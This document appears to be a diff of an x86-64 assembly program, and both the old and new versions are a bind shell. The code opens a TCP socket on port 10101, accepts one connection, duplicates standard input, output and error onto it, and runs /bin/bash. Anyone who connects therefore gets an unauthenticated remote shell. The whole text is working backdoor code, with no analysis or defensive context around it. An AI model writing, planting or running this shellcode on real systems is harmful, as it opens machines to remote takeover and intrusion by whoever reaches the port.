@@ -1,75 +1,81 @@
-/* .bss section */
-        .section .bss
-sin:
-        .space 16
-
-/* .data section */
-        .section .data
-        .globl sock
-        .globl fd
-sock:
+.section .data
+    sockfd:
         .long 0
-fd:
+    fd:
         .long 0
+    bash:
+        .asciz "/bin/bash"
 
-/* .text section */
-        .section .text
-        .globl main
-main:
-        /* socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
-        movq $SYS_SOCKET, %rax
-        movq $AF_INET, %rdi
-        movq $SOCK_STREAM, %rsi
-        movq $IPPROTO_TCP, %rdx
-        syscall
+.section .bss
+    sin:
+        .skip 16
 
-        /* store socket descriptor */
-        movq %rax, sock(%rip)
+.section .text
+.globl _start
+_start:
+    # Create socket
+    movq $SYS_SOCKET, %rax
+    movq $AF_INET, %rdi
+    movq $SOCK_STREAM, %rsi
+    movq $IPPROTO_TCP, %rdx
+    syscall
+    movq %rax, sockfd(%rip)
 
-        /* sin.sin_family = AF_INET */
-        movw $AF_INET, sin(%rip)
+    # Prepare sockaddr_in structure
+    movw $AF_INET, sin(%rip)
+    movw $0x7527, %ax
+    xchg %ah, %al
+    movw %ax, sin+2(%rip)
 
-        /* sin.sin_port = htons(10101) */
-        movw $10101, %ax
-        xchgb %ah, %al
-        movw %ax, sin+2(%rip)
+    # Bind
+    movq $SYS_BIND, %rax
+    movq sockfd(%rip), %rdi
+    leaq sin(%rip), %rsi
+    movq $16, %rdx
+    syscall
 
-        /* bind(sock, &sin, sizeof(sin)) */
-        movq $SYS_BIND, %rax
-        movq sock(%rip), %rdi
-        leaq sin(%rip), %rsi
-        movq $16, %rdx
-        syscall
+    # Listen
+    movq $SYS_LISTEN, %rax
+    movq sockfd(%rip), %rdi
+    movq $1, %rsi
+    syscall
 
-        /* listen(sock, 1) */
-        movq $SYS_LISTEN, %rax
-        movq sock(%rip), %rdi
-        movq $1, %rsi
-        syscall
+    # Accept
+    movq $SYS_ACCEPT, %rax
+    movq sockfd(%rip), %rdi
+    xorq %rsi, %rsi
+    xorq %rdx, %rdx
+    syscall
+    movq %rax, fd(%rip)
 
-        /* accept(sock, NULL, NULL) */
-        movq $SYS_ACCEPT, %rax
-        movq sock(%rip), %rdi
-        movq $0, %rsi
-        movq $0, %rdx
-        syscall
+    # Duplicate file descriptors
+    movq $SYS_DUP2, %rax
+    movq fd(%rip), %rdi
+    xorq %rsi, %rsi
+    movq $0, %rdx
+    syscall
 
-        /* store file descriptor */
-        movq %rax, fd(%rip)
+    movq $SYS_DUP2, %rax
+    movq fd(%rip), %rdi
+    movq $1, %rsi
+    movq $0, %rdx
+    syscall
 
-        /* dup2(fd, stdin), dup2(fd, stdout), dup2(fd, stderr) */
-        movq $SYS_DUP2, %rax
-        movq fd(%rip), %rdi
-        movq $0, %rsi
-        syscall
-        movq $1, %rsi
-        syscall
-        movq $2, %rsi
-        syscall
+    movq $SYS_DUP2, %rax
+    movq fd(%rip), %rdi
+    movq $2, %rsi
+    movq $0, %rdx
+    syscall
 
-        /* execve("/bin/bash", NULL, NULL) */
-        movq $SYS_EXECVE, %rax
-        movq $bash, %rdi
-        xor %rsi, %rsi
-        xor %rdx, %rdx
-        syscall
+    # Execute /bin/bash
+    movq $SYS_EXECVE, %rax
+    leaq bash(%rip), %rdi
+    xorq %rsi, %rsi
+    xorq %rdx, %rdx
+    syscall
+
+    # Exit
+    movq $SYS_EXIT, %rax
+    xorq %rdi, %rdi
+    syscall
+
